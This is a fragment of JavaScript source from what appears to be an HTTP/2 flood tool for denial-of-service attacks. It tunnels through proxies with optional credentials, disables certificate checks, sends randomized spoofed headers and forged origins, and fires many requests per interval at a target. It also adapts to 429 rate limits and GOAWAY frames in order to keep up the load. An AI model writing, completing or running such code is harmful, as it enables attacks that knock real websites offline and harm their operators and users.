        ...(Math.random() < 0.556656 ? { ['xyz-ethernetads-sys-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
        ...(Math.random() < 0.6767676767 ? { "Purpure-Secretf-Id": "formula-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.678787878787 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "Router-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.6799898989899 ? { ["Java-X-Xdp" + generateRandomString(1, 2)]: "####////X-not-Tl-s-F--" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.67232323343 ? { ["Root-User" + generateRandomString(1, 2)]: "Villain-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.674343434434 ? { ["Sys-NodeJs-" + generateRandomString(1, 2)]: "Router-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.83434343434 ? { "Origin": Math.random() < 0.2 ? "https://" + urihost[Math.floor(Math.random() * urihost.length)] + (Math.random() < 0.2 ? ":" + getRandomInt(1, 9999) + '/' : '@root/') : "https://" + (Math.random() < 0.2 ? 'root-admin.' : 'root-root.') + randomEngine } : {}),
        ...(Math.random() < 0.55445545455454 ? { ['X-Sec-Width-From-' + generateRandomString(1, 2)]: generateRandomString(1, 2) + '-' + generateRandomString(1, 2) + '=' + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.554545454545 ? { ['User-X-With-' + generateRandomString(1, 2)]: generateRandomString(1, 2) + '-' + generateRandomString(1, 2) + '-' + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.67434343434343 ? { ['X-C-Python-' + generateRandomString(1, 2)]: generateRandomString(1, 2) + '-' + generateRandomString(1, 2) + '=' + generateRandomString(1, 2) } : {})
    }.shuffle();
    let pendingRequests = [];
    function sendRequest(headers) {
        const req = client.request(headers, {
            endStream: true
        });
        req.on('error', () => req.destroy());
        req.end();
        pendingRequests.push(headers);
    }
    let pragmalenght = querylenght.split("-");
    if (querylenght !== "1-1") {
        pragmalenght = querylenght.split("-");
    }
    const pargram = generateRandomString(parseInt(pragmalenght[0]), parseInt(pragmalenght[1]));
    async function createCustomTLSSocket(parsed, socket) {
        try {
            const tls_conn = await tls.connect({
                servername: parsed.host,
                host: parsed.host,
                port: 443,
                socket: socket,
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: 'X25519:prime256v1:secp384r1',
                ALPNProtocols: ['h2', 'http/1.1'],
                honorCipherOrder: true,
                secureOptions: secureOptionsList.reduce((acc, opt) => acc | opt, 0),
                ...(Math.random() < 0.5 ? { requestOCSP: true } : { requestCert: true }),
                highWaterMark: 1024 * 1024
            });
            return tls_conn;
        } catch (err) {
            throw err;
        }
    }
    const closeConnections = (client, connection, tlsSocket, socket, threaf) => {
        if (client) client.destroy();
        if (socket) socket.end();
        if (connection) connection.destroy();
        if (tlsSocket) tlsSocket.end();
        if (threaf) clearInterval(threaf);
    };
    let procxy = [];
    for (let o = 0; o < 10; o++) {
        const agent = new http.Agent({
            host: proxy[0],
            port: proxy[1],
            keepAlive: true,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity
        });
        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
                ...(proxy[2] && proxy[3] ? { 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}` } : {})
            }
        };
        let connection = http.request(Optionsreq, (res) => {});
        connection.on('error', (err) => {
            connection.destroy();
        });
        connection.on('timeout', () => {});
        procxy.push(connection);
    }
    procxy.forEach((connection, index) => {
        connection.on('connect', async function(res, socket) {
            let tlsSocket;
            try {
                tlsSocket = await createCustomTLSSocket(parsed, socket);
            } catch (err) {
                closeConnections(null, connection, null, socket);
                return;
            }
            let client;
            try {
                client = await http2.connect(parsed.href, {
                    createConnection: () => tlsSocket,
                    settings: {
                        headerTableSize: 65536,
                        enablePush: false,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144
                    }
                }, (session) => {
                    session.setLocalWindowSize(15663105 + 65535);
                });
            } catch (err) {
                closeConnections(null, connection, tlsSocket, socket);
                return;
            }
            client.on('error', err => {
                closeConnections(client, connection, tlsSocket, socket);
            });
            client.on('goaway', (errorCode, lastStreamID, opaqueData) => {
                pendingRequests.forEach(headers => sendRequest(headers));
                closeConnections(client, connection, tlsSocket, socket);
                if (ratelimit0) {
                    applyBackoff(backoffConfig.onGoaway, 1).catch(() => {});
                }
            });
            client.on('close', () => {
                closeConnections(client, connection, tlsSocket, socket);
            });
            client.once('connect', async () => {
                const intervalId = setInterval(async () => {
                    if (client.destroyed) {
                        clearInterval(intervalId);
                        client.close();
                        return;
                    }
                    for (let i = 0; i < rps; i++) {
                        let author = {
                            ...(post === 'true' ? { ":method": "POST", "content-length": "0" } : { ":method": 'GET' }),
                            ":authority": parsed.host,
                            ":scheme": "https",
                            ":path": path
                        };
                        const pre = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary');
                        const head = header;
                        const request = client.request({ ...author, ...head }, {
                            endStream: Math.random() < 0.5,
                            weight: 256,
                            parent: 0,
                            exclusive: true
                        });
                        request.on('response', (res) => {
                            request.push(pre);
                            reswritedata(request);
                            response(res);
                            const status1 = res[':status'];
                            if (ratelimit0 && status1 === 429) {
                                maprate.push({ proxy: proxy[0], timestamp: Date.now() });
                                rps = 5;
                                closeConnections(client, connection, tlsSocket, socket, intervalId);
                                   if (res["retry-after"]) {
                                    const retryAfter = parseInt(res["retry-after"]) * 1000;
                                    applyBackoff(backoffConfig.on429, 1, retryAfter).catch(() => {});
                                } else {
                                    applyBackoff(backoffConfig.on429, 1).catch(() => {});
                                }
                            }
                            if (res["set-cookie"]) {
                                chead["cookie"] = res["set-cookie"].join("; ");
                            }
                            if (redirect && res["location"]) {
                                parsed = new URL(res["location"]);
                                if (ratelimit0) {
                                    applyBackoff(backoffConfig.onRedirect, 1).catch(() => {});
                                                        setTimeout(() => {
                        if (!request.closed) {
                            try { request.close(); } catch(e){}
                        }
                    }, getRandomInt(50, 250));
                                }
                            }
                        });
                        request.on('error', (err) => {
                            request.destroy();
                        });
                        request.end();
                    }
                }, interval);
                setTimeout(() => {
                    closeConnections(client, connection, tlsSocket, socket, intervalId);
                }, 5 * 1000);
            });
        });
        connection.end();
    });
}